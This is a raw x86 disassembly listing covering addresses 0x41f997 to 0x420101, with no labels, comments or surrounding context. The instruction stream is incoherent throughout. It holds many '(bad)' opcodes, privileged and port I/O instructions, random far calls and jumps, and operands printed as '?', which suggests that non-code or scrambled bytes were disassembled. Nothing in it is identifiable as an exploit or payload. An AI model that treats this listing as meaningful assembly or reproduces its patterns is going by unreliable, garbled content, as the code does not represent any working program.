  41f997:	fiadd  DWORD PTR [ebx-0x1970722d]
  41f99d:	icebp  
  41f99e:	mov    BYTE PTR [ebx],al
  41f9a0:	rcr    BYTE PTR [edx-0x2],0xbe
  41f9a4:	xlat   BYTE PTR ds:[ebx]
  41f9a5:	repnz push 0x288a23eb
  41f9ab:	mov    BYTE PTR [ebx+ebp*8+0x7f515a9f],bl
  41f9b2:	mov    ebx,0xfa9b40df
  41f9b7:	not    edx
  41f9b9:	(bad)  
  41f9ba:	dec    esp
  41f9bb:	sub    al,0x95
  41f9bd:	clc    
  41f9be:	xchg   ebx,eax
  41f9bf:	lahf   
  41f9c0:	pusha  
  41f9c1:	xchg   DWORD PTR [edi],ecx
  41f9c3:	and    eax,0x82f9f0e3
  41f9c8:	sub    BYTE PTR [eax-0x6f],dl
  41f9cb:	call   0xdc7a:0xd36780a4
  41f9d2:	(bad)  
  41f9d3:	ins    BYTE PTR es:[edi],dx
  41f9d4:	bound  ecx,QWORD PTR [esi+0x122c60d6]
  41f9da:	rol    DWORD PTR [ebp*4+0x749d58c8],0x7d
  41f9e2:	jno    0x41f973
  41f9e4:	repnz mov esi,ebp
  41f9e7:	dec    esi
  41f9e8:	mov    BYTE PTR [esi+0x6],bl
  41f9eb:	jo     0x41fa0b
  41f9ed:	add    eax,0x19b28ff4
  41f9f2:	fadd   QWORD PTR [esi-0x75]
  41f9f5:	sub    eax,0xd123882
  41f9fa:	mov    dl,0xf3
  41f9fc:	clc    
  41f9fd:	sti    
  41f9fe:	mov    eax,0xba000d4f
  41fa03:	adc    al,0xba
  41fa05:	jl     0x41f9c4
  41fa07:	lea    esi,[ecx-0x41]
  41fa0a:	stos   DWORD PTR es:[edi],eax
  41fa0b:	push   es
  41fa0c:	xchg   ebp,eax
  41fa0d:	inc    esp
  41fa0e:	imul   edi,DWORD PTR [ebx-0x4e487ffc],0x8fd32752
  41fa18:	(bad)
  41fa1c:	sbb    BYTE PTR [esi-0x30],0x8a
  41fa20:	bound  ebp,QWORD PTR [edx]
  41fa22:	fwait
  41fa23:	inc    edx
  41fa24:	shl    edi,cl
  41fa26:	inc    edi
  41fa27:	enter  0x27ef,0x65
  41fa2b:	aaa    
  41fa2c:	jo     0x41fa92
  41fa2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa2f:	mov    ebx,?
  41fa31:	int3   
  41fa32:	sbb    bl,dh
  41fa34:	xchg   ebx,eax
  41fa35:	outs   dx,DWORD PTR ds:[esi]
  41fa36:	sub    eax,DWORD PTR [ebp+0x3b]
  41fa39:	xchg   ebp,eax
  41fa3a:	lea    esi,[ecx]
  41fa3c:	cmp    al,BYTE PTR [esi+0x6b]
  41fa3f:	(bad)  
  41fa40:	(bad)  
  41fa42:	imul   esi,DWORD PTR [ebp-0x64],0x15
  41fa46:	mov    esp,cr3
  41fa49:	lods   al,BYTE PTR ds:[esi]
  41fa4a:	loope  0x41fa2f
  41fa4c:	icebp  
  41fa4d:	xchg   esi,eax
  41fa4e:	ror    dl,cl
  41fa50:	add    eax,DWORD PTR [ebp-0x35bc21f0]
  41fa56:	mov    ebp,0xd9a498e0
  41fa5b:	push   es
  41fa5c:	std    
  41fa5d:	rol    BYTE PTR [eax-0x34200c66],1
  41fa63:	cmp    cl,cl
  41fa65:	sub    BYTE PTR [ebp-0x5011f5f4],dh
  41fa6b:	xor    al,0xb0
  41fa6d:	test   esi,ebp
  41fa6f:	les    edx,FWORD PTR [ebx]
  41fa71:	jae    0x41fa84
  41fa73:	cld    
  41fa74:	gs jnp 0x41fa7c
  41fa77:	(bad)  
  41fa79:	push   ebx
  41fa7a:	mov    ebp,0xd2840007
  41fa7f:	mov    dl,BYTE PTR [ebp-0x6d]
  41fa82:	loopne 0x41fa24
  41fa84:	inc    ecx
  41fa85:	add    al,dl
  41fa87:	jge    0x41fa6b
  41fa89:	add    DWORD PTR gs:[esi+0x20],ebx
  41fa8d:	into   
  41fa8e:	hlt    
  41fa8f:	fstp   TBYTE PTR [edi+0x14]
  41fa92:	stos   DWORD PTR es:[edi],eax
  41fa93:	and    BYTE PTR [eax-0x2e6186b],dh
  41fa99:	jnp    0x41fae8
  41fa9b:	push   es
  41fa9c:	jl     0x41fa96
  41fa9e:	loope  0x41fa36
  41faa0:	xor    al,0xfe
  41faa2:	outs   dx,DWORD PTR ds:[esi]
  41faa4:	loope  0x41fb0a
  41faa6:	mov    dh,0x4d
  41faa8:	xchg   ebx,eax
  41faa9:	mov    esi,0x7488ab0e
  41faae:	sub    al,BYTE PTR [ebx-0x14f92a7d]
  41fab4:	sbb    esp,ebp
  41fab6:	jne    0x41fa5c
  41fab8:	sti    
  41fab9:	dec    ecx
  41faba:	pop    ds
  41fabb:	outs   dx,BYTE PTR ds:[esi]
  41fabc:	fwait
  41fabd:	sub    eax,0xa9f74620
  41fac2:	dec    ebp
  41fac3:	mov    bl,BYTE PTR [edi-0x18166759]
  41fac9:	leave  
  41faca:	adc    BYTE PTR [edx-0x65],ah
  41facd:	or     ah,BYTE PTR [ebx]
  41facf:	dec    esi
  41fad0:	aad    0x28
  41fad2:	sti    
  41fad3:	push   eax
  41fad4:	sbb    dh,dl
  41fad6:	fild   WORD PTR [ebp*2-0xe8ce694]
  41fadd:	(bad)  
  41fade:	popf   
  41fadf:	or     DWORD PTR [eax-0x54],ebx
  41fae2:	out    dx,eax
  41fae3:	fld    st(5)
  41fae5:	or     dh,BYTE PTR [esi]
  41fae7:	shl    DWORD PTR [ebp-0x46],1
  41faea:	mov    ?,ebp
  41faec:	mov    bh,0x97
  41faee:	mov    WORD PTR [edx-0x66],gs
  41faf1:	push   ss
  41faf2:	mov    esp,0x5f61df45
  41faf7:	mov    bl,0x8d
  41faf9:	or     al,0xdd
  41fafb:	push   ds
  41fafc:	push   edi
  41fafd:	(bad)  
  41fafe:	adc    dl,BYTE PTR [edx+0x135c7459]
  41fb04:	cs adc eax,0x431e247f
  41fb0a:	lods   eax,DWORD PTR ds:[esi]
  41fb0b:	arpl   bp,si
  41fb0d:	retf   0xad42
  41fb10:	jle    0x41fb05
  41fb12:	jl     0x41fb32
  41fb14:	outs   dx,DWORD PTR ds:[esi]
  41fb15:	iret   
  41fb16:	ins    DWORD PTR es:[edi],dx
  41fb17:	inc    eax
  41fb18:	mov    esi,?
  41fb1a:	inc    edx
  41fb1c:	inc    edx
  41fb1d:	sahf   
  41fb1e:	cs inc ecx
  41fb20:	sbb    cl,cl
  41fb22:	push   eax
  41fb23:	adc    al,0x27
  41fb25:	mov    dh,0xaa
  41fb27:	sub    dh,BYTE PTR [esi-0x1e]
  41fb2a:	in     eax,0xf9
  41fb2c:	and    eax,0x111e9d44
  41fb31:	call   eax
  41fb33:	les    eax,FWORD PTR [esi+0x32]
  41fb36:	xor    DWORD PTR [edi],edx
  41fb38:	dec    edi
  41fb39:	fist   DWORD PTR [esi+0x1b7609c0]
  41fb3f:	mov    bl,0xac
  41fb41:	jecxz  0x41fb41
  41fb43:	xchg   edx,eax
  41fb44:	movsx  edi,WORD PTR [ebx+eiz*8+0xc185e20]
  41fb4c:	bound  ecx,QWORD PTR [esi+ebp*8+0x16edd5da]
  41fb53:	fimul  WORD PTR [esi+0x3dba131e]
  41fb59:	popf   
  41fb5a:	(bad)  
  41fb5b:	int    0x4
  41fb5d:	rcl    DWORD PTR [edi+0x5744b94],0x6d
  41fb64:	sub    al,0x48
  41fb66:	fcomip st,st(0)
  41fb68:	push   esi
  41fb69:	ror    esi,cl
  41fb6b:	jmp    0x40f:0xf7096c14
  41fb72:	imul   eax,DWORD PTR [ebp+0x1d],0x3e
  41fb76:	fiadd  DWORD PTR [eax-0x10]
  41fb79:	mov    BYTE PTR [edx],al
  41fb7b:	rcr    BYTE PTR [edx-0x2],0xfe
  41fb7f:	pusha  
  41fb80:	hlt    
  41fb81:	cdq    
  41fb82:	sahf   
  41fb83:	xchg   DWORD PTR [edi],edx
  41fb85:	mov    eax,ds:0xc515a413
  41fb8a:	mov    ss,WORD PTR [ebx-0x7c4ef11a]
  41fb90:	(bad)  
  41fb91:	fsubr  DWORD PTR [edx]
  41fb93:	imul   edx,edx,0x3f3b1f3b
  41fb99:	(bad)  
  41fb9a:	fwait
  41fb9b:	adc    al,bl
  41fb9d:	and    DWORD PTR [ebx-0x7e6f6292],esi
  41fba3:	std    
  41fba4:	ror    DWORD PTR [eax],0x6e
  41fba7:	ja     0x41fba6
  41fba9:	clc    
  41fbaa:	scas   al,BYTE PTR es:[edi]
  41fbab:	dec    esp
  41fbac:	and    ecx,esi
  41fbae:	repz push cs
  41fbb0:	and    DWORD PTR [eax],0x899f1a4c
  41fbb6:	test   BYTE PTR [eax],dh
  41fbb8:	dec    edi
  41fbb9:	stos   DWORD PTR es:[edi],eax
  41fbba:	aam    0x21
  41fbbc:	mov    ch,0xee
  41fbbe:	xchg   edx,eax
  41fbbf:	or     BYTE PTR [esi+0x52],0x49
  41fbc3:	shl    ch,1
  41fbc5:	arpl   WORD PTR [ebx-0x747a3fe5],di
  41fbcb:	jnp    0x41fb62
  41fbcd:	pop    edi
  41fbce:	fsub   st(2),st
  41fbd0:	push   edi
  41fbd1:	cmp    cl,BYTE PTR [ebp+edx*8-0x36ac3f97]
  41fbd8:	add    BYTE PTR [esi+0x1c8e3e33],bl
  41fbde:	test   ebp,ecx
  41fbe0:	loop   0x41fbd5
  41fbe2:	sub    esi,DWORD PTR [ebp-0x7afbfdda]
  41fbe8:	sbb    al,0x9f
  41fbea:	aas    
  41fbeb:	pop    edi
  41fbec:	outs   dx,DWORD PTR ds:[esi]
  41fbed:	(bad)  
  41fbee:	(bad)  
  41fbef:	fistp  WORD PTR [ebx]
  41fbf1:	adc    DWORD PTR [esi],edi
  41fbf3:	pop    eax
  41fbf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fbf5:	pop    edi
  41fbf6:	dec    ecx
  41fbf7:	sub    edx,DWORD PTR [esi-0x60d3041b]
  41fbfd:	sti    
  41fbfe:	xor    ch,BYTE PTR [edx]
  41fc00:	push   0x5179429a
  41fc05:	mov    edx,0x647fd377
  41fc0a:	or     eax,0x2f42a16e
  41fc0f:	cmp    bh,BYTE PTR [ebp+0xb3908f1]
  41fc15:	add    al,0xe
  41fc17:	jno    0x41fc20
  41fc19:	xor    ch,BYTE PTR [ebp-0x3f5e31c4]
  41fc1f:	pop    esp
  41fc20:	iret   
  41fc21:	addr16 inc ebp
  41fc23:	inc    esi
  41fc24:	inc    esi
  41fc25:	xor    DWORD PTR [edx-0x19],ecx
  41fc28:	pop    eax
  41fc29:	(bad)  
  41fc2a:	es inc esi
  41fc2c:	dec    esp
  41fc2d:	pop    es
  41fc2e:	ja     0x41fc5d
  41fc30:	aad    0x70
  41fc32:	sub    DWORD PTR [ebp-0x8196d84],ebp
  41fc38:	das    
  41fc39:	in     al,dx
  41fc3a:	adc    al,0x76
  41fc3c:	cli    
  41fc3d:	test   esi,esi
  41fc3f:	fisttp DWORD PTR [eax-0x7c]
  41fc42:	inc    edx
  41fc43:	sbb    BYTE PTR [ebx],ah
  41fc45:	add    ebx,DWORD PTR [eax+0x6a]
  41fc48:	aam    0x11
  41fc4a:	icebp  
  41fc4b:	xchg   DWORD PTR [eax+0x3f],edi
  41fc4e:	mov    edi,DWORD PTR [esi]
  41fc50:	ja     0x41fc92
  41fc52:	dec    ebp
  41fc53:	sar    DWORD PTR [ecx+0x212da254],1
  41fc59:	pop    ds
  41fc5a:	(bad)  
  41fc5b:	stos   BYTE PTR es:[edi],al
  41fc5c:	mov    al,0x84
  41fc5e:	stos   DWORD PTR es:[edi],eax
  41fc5f:	repnz popf 
  41fc61:	pop    es
  41fc62:	add    eax,0xbf40c600
  41fc67:	call   0xac4afd21
  41fc6c:	add    BYTE PTR [eax+0xa720266],0x0
  41fc73:	retf   
  41fc74:	hlt    
  41fc75:	call   0x7fd2:0xa483b1b0
  41fc7c:	xchg   ebp,eax
  41fc7d:	mov    esp,DWORD PTR [ebx-0x76]
  41fc80:	hlt    
  41fc81:	fisub  DWORD PTR [ebp-0x3]
  41fc84:	dec    ebx
  41fc85:	and    eax,0xc12a2e32
  41fc8a:	push   0xf81b822a
  41fc8f:	cmp    ch,BYTE PTR [edx-0x77]
  41fc92:	(bad)
  41fc95:	push   DWORD PTR [edi+0x7076efe0]
  41fc9b:	popa   
  41fc9c:	enter  0x8644,0xf
  41fca0:	fwait
  41fca1:	inc    di
  41fca3:	in     eax,dx
  41fca4:	jmp    0xb3d1:0xae181887
  41fcab:	add    BYTE PTR [edx+edx*8],0x1c
  41fcaf:	jmp    0x41fc63
  41fcb1:	test   DWORD PTR [ebp+0x79],esi
  41fcb4:	or     ebx,DWORD PTR [edi]
  41fcb6:	cld    
  41fcb7:	mov    ecx,0xcde406c8
  41fcbc:	xor    BYTE PTR [edx],bh
  41fcbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fcbf:	or     bl,dh
  41fcc1:	jmp    0xd97d6e7c
  41fcc6:	(bad)  
  41fcc7:	(bad)  [ebx+eax*4+0x69]
  41fccb:	ss out dx,al
  41fccd:	xor    ch,BYTE PTR [ebx+0x71]
  41fcd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fcd1:	inc    ebp
  41fcd2:	xchg   edi,eax
  41fcd3:	inc    ecx
  41fcd4:	pushw  ds
  41fcd6:	js     0x41fc67
  41fcd8:	adc    BYTE PTR [ecx],al
  41fcda:	and    DWORD PTR [esi],ebx
  41fcdc:	and    eax,0xec5ae88f
  41fce1:	stos   DWORD PTR es:[edi],eax
  41fce2:	adc    BYTE PTR [ebp+0x3280a980],cl
  41fce8:	in     al,0xb3
  41fcea:	jo     0x41fd0d
  41fcec:	add    DWORD PTR [edx],esi
  41fcee:	in     al,dx
  41fcef:	(bad)  
  41fcf1:	jb     0x41fd2d
  41fcf3:	cmp    edx,0xfffffffc
  41fcf6:	cmp    al,0xda
  41fcf8:	cdq    
  41fcf9:	sub    al,0x16
  41fcfb:	sub    eax,DWORD PTR [edx*4+0x569a30dc]
  41fd02:	pop    ss
  41fd03:	retf   
  41fd04:	aad    0x22
  41fd06:	push   ds
  41fd07:	push   edi
  41fd08:	sub    esp,DWORD PTR [ebx+0x65]
  41fd0b:	ret    
  41fd0c:	inc    esi
  41fd0d:	retf   0xef16
  41fd10:	inc    ebx
  41fd11:	jns    0x41fcee
  41fd13:	ss adc al,bl
  41fd16:	adc    bh,bl
  41fd18:	ja     0x41fc9e
  41fd1a:	lods   al,BYTE PTR ds:[esi]
  41fd1b:	out    0x5c,eax
  41fd1d:	xchg   esi,eax
  41fd1e:	fnstsw WORD PTR [eax+0xf3f0973]
  41fd24:	inc    esp
  41fd25:	icebp  
  41fd26:	mov    bl,0x58
  41fd28:	or     bl,BYTE PTR [ebx+0x43]
  41fd2b:	jle    0x41fd99
  41fd2d:	pop    cx
  41fd2f:	sahf   
  41fd30:	inc    eax
  41fd31:	(bad)  
  41fd33:	loop   0x41fcec
  41fd35:	icebp  
  41fd36:	lahf   
  41fd37:	leave  
  41fd38:	xor    al,0xce
  41fd3a:	retf   0x3084
  41fd3d:	pop    edx
  41fd3e:	retf   
  41fd3f:	jecxz  0x41fd0d
  41fd41:	test   DWORD PTR [edx],eax
  41fd43:	mov    WORD PTR [esi+0x1dc698ad],gs
  41fd49:	xor    cl,dh
  41fd4b:	loope  0x41fd43
  41fd4d:	xchg   esp,eax
  41fd4e:	pop    edi
  41fd4f:	pop    es
  41fd50:	gs xchg ebp,eax
  41fd52:	jo     0x41fdc8
  41fd54:	test   BYTE PTR [esi+0x1c18231e],ah
  41fd5a:	pop    ds
  41fd5b:	cmp    BYTE PTR [esi],bl
  41fd5d:	shl    DWORD PTR cs:[ebx],0x6
  41fd61:	add    BYTE PTR [esi-0x1b],bl
  41fd64:	test   DWORD PTR [esi-0x282840e],0x8117c541
  41fd6e:	mov    ds:0x9e2ce3dc,eax
  41fd73:	dec    ecx
  41fd74:	mov    dh,0x92
  41fd76:	int3   
  41fd77:	mov    ecx,0x22d980cb
  41fd7c:	test   eax,0x2155ae59
  41fd81:	int    0xa
  41fd83:	loop   0x41fda8
  41fd85:	dec    ebp
  41fd86:	adc    ebx,DWORD PTR [ebx]
  41fd88:	xchg   ebx,eax
  41fd89:	inc    ecx
  41fd8a:	xor    eax,0x996d3615
  41fd8f:	mov    eax,0x8320928e
  41fd94:	gs jle 0x41fdb0
  41fd97:	xor    DWORD PTR [edi-0x2a58487],edx
  41fd9d:	mov    ebp,0xa6a93ad5
  41fda2:	movd   DWORD PTR [edx+0x7d],mm0
  41fda6:	sub    bl,BYTE PTR [eax]
  41fda8:	mov    ds:0xacd1c4c2,al
  41fdad:	mov    ah,0xf0
  41fdaf:	inc    edi
  41fdb0:	lds    ebp,FWORD PTR [ecx-0x2b]
  41fdb3:	sub    DWORD PTR ds:0xba4002ac,ecx
  41fdb9:	das    
  41fdba:	hlt    
  41fdbb:	jecxz  0x41fd76
  41fdbd:	or     al,0xde
  41fdbf:	inc    edx
  41fdc0:	mov    edx,0x3fdfa419
  41fdc5:	push   edi
  41fdc6:	stos   BYTE PTR es:[edi],al
  41fdc7:	bound  edi,QWORD PTR [esi+0x3264c4da]
  41fdcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fdce:	retf   0x4cb6
  41fdd1:	cli    
  41fdd2:	pop    esi
  41fdd3:	mov    bh,0xf8
  41fdd5:	sahf   
  41fdd6:	es mov ebx,0xe09e0a46
  41fddc:	repz inc esi
  41fdde:	std    
  41fddf:	push   eax
  41fde0:	push   esi
  41fde1:	in     al,dx
  41fde2:	jmp    0x619aabb
  41fde7:	(bad)  
  41fde9:	aam    0xfb
  41fdeb:	or     ecx,DWORD PTR [esi+0xe]
  41fdee:	fbld   TBYTE PTR [ebp+eiz*2-0x69]
  41fdf2:	or     eax,0x6ddbe63f
  41fdf7:	ins    BYTE PTR es:[edi],dx
  41fdf8:	dec    edx
  41fdf9:	lds    esp,FWORD PTR [eax]
  41fdfb:	xor    ebp,ebx
  41fdfd:	(bad)  
  41fdfe:	in     eax,dx
  41fdff:	sub    ah,ch
  41fe01:	add    ch,BYTE PTR [esi-0x54]
  41fe04:	aad    0x70
  41fe06:	cs add eax,0x614a9fda
  41fe0c:	(bad)  
  41fe0d:	out    0xa8,eax
  41fe0f:	sbb    BYTE PTR [ecx+0xd83ab62],al
  41fe15:	adc    al,0xac
  41fe17:	scas   eax,DWORD PTR es:[edi]
  41fe18:	lock jle 0x41fdf2
  41fe1b:	shl    edx,cl
  41fe1d:	jl     0x41fe9d
  41fe1f:	xor    al,0x81
  41fe21:	jge    0x41fe71
  41fe23:	add    BYTE PTR ds:0x47cca30a,ch
  41fe29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe2a:	loop   0x41fe3d
  41fe2c:	test   cl,ch
  41fe2e:	daa    
  41fe2f:	fwait
  41fe30:	mov    ah,0x8c
  41fe32:	and    eax,0xb14d9432
  41fe37:	sahf   
  41fe38:	sbb    eax,0x6aba752d
  41fe3d:	xchg   dl,ah
  41fe3f:	or     eax,DWORD PTR [esi+0xb]
  41fe42:	push   edi
  41fe43:	lods   eax,DWORD PTR ds:[esi]
  41fe44:	xor    al,0x1f
  41fe46:	xor    BYTE PTR [eax],al
  41fe48:	call   0x20f2784b
  41fe4d:	mov    al,0x41
  41fe4f:	cli    
  41fe50:	mov    ch,al
  41fe52:	std    
  41fe53:	pop    ebx
  41fe54:	jl     0x41fe09
  41fe56:	aaa    
  41fe57:	sahf   
  41fe58:	les    ebx,FWORD PTR [edi+0x2e]
  41fe5b:	retf   0x874c
  41fe5e:	cvtdq2ps xmm1,xmm1
  41fe61:	xchg   esi,eax
  41fe62:	data16 fcom DWORD PTR [edi]
  41fe65:	ss jge 0x41fed6
  41fe68:	or     DWORD PTR [esi+0x3a],edx
  41fe6b:	inc    edx
  41fe6c:	lds    edi,FWORD PTR [ebp-0x4b1f155d]
  41fe72:	jo     0x41fe74
  41fe74:	ins    DWORD PTR es:[edi],dx
  41fe75:	shl    ah,cl
  41fe77:	jno    0x41fe2f
  41fe79:	jmp    0x17594cb7
  41fe7e:	adc    al,cl
  41fe80:	mov    edi,0x43bd1444
  41fe85:	ret    0xd88d
  41fe88:	aaa    
  41fe89:	scas   al,BYTE PTR es:[edi]
  41fe8a:	rol    DWORD PTR [ebx],cl
  41fe8c:	or     DWORD PTR [ecx+eax*1],0x51
  41fe90:	cwde   
  41fe91:	(bad)  
  41fe92:	stos   DWORD PTR es:[edi],eax
  41fe93:	pop    ecx
  41fe94:	cmp    bh,0x8c
  41fe97:	or     al,0x21
  41fe99:	pusha  
  41fe9a:	push   es
  41fe9b:	xchg   ecx,eax
  41fe9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe9d:	(bad)  [esi+0x32]
  41fea0:	adc    eax,0xb34b89f5
  41fea5:	mov    eax,0xc254fcd
  41feaa:	mov    eax,0xb07bcc38
  41feaf:	push   edi
  41feb0:	ror    DWORD PTR [esi],1
  41feb2:	enter  0x4cef,0xf6
  41feb6:	jae    0x41fe4b
  41feb8:	xchg   esp,eax
  41feb9:	fild   WORD PTR [edi+0x321b5e51]
  41febf:	fxch   st(2)
  41fec1:	in     al,dx
  41fec2:	sti    
  41fec3:	jp     0x41fe4c
  41fec5:	or     bl,BYTE PTR [ebx+esi*8]
  41fec8:	and    ebp,ecx
  41feca:	or     esp,DWORD PTR [ecx-0x35]
  41fecd:	sar    DWORD PTR [ecx+0x7c],0x27
  41fed1:	cmp    eax,0xdf9f1f02
  41fed6:	mov    cl,0xda
  41fed8:	push   0x4b40edb2
  41fedd:	fisub  WORD PTR [ecx]
  41fedf:	push   0xd7af7874
  41fee4:	ss imul edi,eax,0x4c
  41fee8:	cmp    BYTE PTR [esi+eiz*1+0x43],cl
  41feec:	neg    al
  41feee:	and    al,0x88
  41fef0:	shl    dl,1
  41fef2:	(bad)  
  41fef3:	adc    DWORD PTR [ebx+edx*1+0x5934f654],edi
  41fefa:	fild   WORD PTR [ecx-0x3f2a884]
  41ff00:	ficom  WORD PTR [esi-0x54]
  41ff03:	bound  eax,QWORD PTR [ebx+0x6e]
  41ff06:	adc    al,0x1b
  41ff08:	clc    
  41ff09:	fwait
  41ff0a:	sub    esi,edx
  41ff0c:	addr16 mov al,al
  41ff0f:	sub    eax,0xa3238c03
  41ff14:	sub    DWORD PTR [esi+0x64c343b3],esi
  41ff1a:	loopne 0x41ff6b
  41ff1c:	jmp    0x41ff69
  41ff1e:	dec    eax
  41ff1f:	adc    al,0x2a
  41ff21:	add    al,0x28
  41ff23:	pusha  
  41ff24:	pop    ds
  41ff25:	sbb    ebx,DWORD PTR [ebx-0x5a]
  41ff28:	fs inc ebp
  41ff2a:	icebp  
  41ff2b:	mov    ebx,DWORD PTR [esi+0x1e810353]
  41ff31:	sub    al,0x5c
  41ff33:	imul   esp,ecx,0xffffffd6
  41ff36:	mov    ds:0x223c12ed,eax
  41ff3b:	add    BYTE PTR [eax],dh
  41ff3d:	call   0x4d140da9
  41ff42:	out    dx,eax
  41ff43:	adc    BYTE PTR [ebx-0x313fbac2],0x62
  41ff4a:	(bad)  
  41ff4b:	xchg   esi,eax
  41ff4c:	lods   al,BYTE PTR ds:[esi]
  41ff4d:	pop    esi
  41ff4e:	and    al,0x57
  41ff50:	mov    WORD PTR [ebp+0x6145cfe2],ds
  41ff56:	cmp    BYTE PTR [ebp-0x24],ah
  41ff59:	pop    ecx
  41ff5a:	daa    
  41ff5b:	aad    0xa4
  41ff5d:	pop    edi
  41ff5e:	mov    ebp,0x108092d7
  41ff63:	aas    
  41ff64:	sub    eax,0x54dd81b1
  41ff69:	in     al,dx
  41ff6a:	scas   al,BYTE PTR es:[edi]
  41ff6b:	(bad)  
  41ff6c:	jmp    0x41ffc0
  41ff6e:	ror    ebx,1
  41ff70:	in     al,dx
  41ff71:	pop    eax
  41ff72:	aas    
  41ff73:	sbb    DWORD PTR [eax-0x6c],eax
  41ff76:	xchg   esi,eax
  41ff77:	shl    BYTE PTR [edx],cl
  41ff79:	lods   eax,DWORD PTR ds:[esi]
  41ff7a:	jae    0x41ff25
  41ff7c:	jl     0x41ffb4
  41ff7e:	test   ebp,ecx
  41ff80:	and    ah,BYTE PTR [edx+0x6f]
  41ff83:	dec    eax
  41ff84:	and    al,0x31
  41ff86:	in     eax,0x8b
  41ff88:	xchg   edx,eax
  41ff89:	xchg   BYTE PTR [esi-0xf],dh
  41ff8c:	mov    dl,0xb9
  41ff8e:	cmp    eax,0x3423aa
  41ff93:	test   dl,bh
  41ff95:	cmp    BYTE PTR [esi+0x11],0x5
  41ff99:	lock adc eax,0x289634e9
  41ff9f:	pushf  
  41ffa0:	jne    0x41ffac
  41ffa2:	inc    ecx
  41ffa3:	pop    ebp
  41ffa4:	add    eax,0x787098b2
  41ffa9:	scas   eax,DWORD PTR es:[edi]
  41ffaa:	sub    dl,BYTE PTR ds:0x7c7e8a6c
  41ffb0:	xlat   BYTE PTR ds:[ebx]
  41ffb1:	in     eax,dx
  41ffb2:	shl    BYTE PTR [ebp+eax*2-0x75da0637],0xcd
  41ffba:	(bad)  
  41ffbb:	xor    ch,bh
  41ffbd:	mov    ebp,0x91b176d2
  41ffc2:	adc    al,0xf4
  41ffc4:	jg     0x41ff68
  41ffc6:	cmp    eax,0x15abe2a7
  41ffcb:	add    edi,DWORD PTR [edi]
  41ffcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ffce:	inc    eax
  41ffcf:	int    0x93
  41ffd1:	test   DWORD PTR [esp+eiz*4],ebx
  41ffd4:	adc    bl,bh
  41ffd6:	sub    BYTE PTR [eax],bl
  41ffd8:	icebp  
  41ffd9:	mov    BYTE PTR [edi+0x48c2916],cl
  41ffdf:	std    
  41ffe0:	aad    0x19
  41ffe2:	cli    
  41ffe3:	enter  0x6295,0x81
  41ffe7:	adc    BYTE PTR [esi],0x46
  41ffea:	sub    BYTE PTR [esi],dl
  41ffec:	es xchg ebx,eax
  41ffee:	call   0x70a76045
  41fff3:	nop
  41fff4:	mov    al,gs:0x14dbf09b
  41fffa:	jmp    0x2c61:0xf812e7af
  420001:	inc    eax
  420002:	jg     0x41ffd9
  420004:	inc    ecx
  420005:	aam    0xf4
  420007:	mov    ds:0x1613a643,eax
  42000c:	retf   
  42000d:	(bad)  
  42000e:	es std 
  420010:	mov    ebp,DWORD PTR ds:0x6852
  420015:	daa    
  420016:	mov    ds:0xd3e92421,eax
  42001b:	out    0x89,al
  42001d:	push   cs
  42001e:	(bad)  
  42001f:	repz fnstcw WORD PTR [eax-0x441e9328]
  420026:	xchg   ebx,ebp
  420028:	(bad)  
  42002a:	add    BYTE PTR [edi+edi*1+0x79],dh
  42002e:	fld    QWORD PTR [ecx+0x4f4040b5]
  420034:	punpckhdq mm2,QWORD PTR [eax]
  420037:	fmul   st,st(0)
  420039:	jmp    0xda4b:0x61f098ef
  420040:	(bad)  
  420041:	xchg   ebp,eax
  420042:	aad    0x28
  420044:	cs aaa 
  420046:	and    esp,DWORD PTR [esi+eiz*1+0x3e]
  42004a:	sub    al,0x88
  42004c:	pop    edi
  42004d:	into   
  42004e:	ds test al,0xb5
  420051:	jmp    0x68bb:0xb62f47ca
  420058:	jbe    0x4200b6
  42005a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42005b:	inc    eax
  42005c:	add    al,dl
  42005e:	fwait
  42005f:	arpl   WORD PTR [ecx+ebp*2],di
  420062:	or     DWORD PTR [ebx],0x30118632
  420068:	jno    0x420017
  42006a:	jp     0x4200a2
  42006c:	fld    QWORD PTR [eax]
  42006e:	mov    dh,0x9f
  420070:	shr    bh,1
  420072:	lods   al,BYTE PTR ds:[esi]
  420073:	or     al,0x9c
  420075:	mov    dl,0x53
  420077:	mov    dh,0xd
  420079:	xor    BYTE PTR gs:[eax+ecx*2-0x3fd649a0],bl
  420081:	dec    ebx
  420082:	sub    ecx,DWORD PTR [eax+edx*1-0x77]
  420086:	xor    al,0x6a
  420088:	sbb    dh,ch
  42008a:	jbe    0x42003d
  42008c:	mov    bh,0xf
  42008e:	sbb    ah,BYTE PTR ds:0xe343a22a
  420094:	and    bl,dl
  420096:	xchg   DWORD PTR [ecx],ebx
  420098:	mov    edx,0xd0b31243
  42009d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42009e:	mov    ebx,0x51860894
  4200a3:	mov    dh,0x5a
  4200a5:	push   0xa8759192
  4200aa:	test   al,0x9
  4200ac:	xor    dl,BYTE PTR [ebp-0x55d73b1f]
  4200b2:	add    al,0x28
  4200b4:	test   eax,0x3ce5fed3
  4200b9:	jl     0x420048
  4200bb:	or     ch,BYTE PTR ds:0xc3230fb1
  4200c1:	and    ecx,DWORD PTR [eax]
  4200c3:	xor    al,0x9a
  4200c5:	cmp    BYTE PTR [edx-0x36],al
  4200c8:	mov    edi,0x55b64125
  4200cd:	mov    ch,0x90
  4200cf:	jecxz  0x420146
  4200d1:	xor    al,BYTE PTR [esi+0x11]
  4200d4:	mov    edx,eax
  4200d6:	jne    0x42007b
  4200d8:	sbb    DWORD PTR [ecx-0x54],0xb0443134
  4200df:	fidivr WORD PTR ds:0x3c748cbf
  4200e5:	xor    DWORD PTR [eax+0x2c],0x8cb56c8d
  4200ec:	sbb    al,0xd
  4200ee:	dec    ebp
  4200ef:	add    BYTE PTR [eax-0x4f],0x91
  4200f3:	xchg   BYTE PTR [ecx-0x4899cfbb],ah
  4200f9:	and    edx,eax
  4200fb:	xchg   BYTE PTR [esi+esi*8-0x36],bh
  4200ff:	cmp    al,0x26
  420101:	dec    ebx
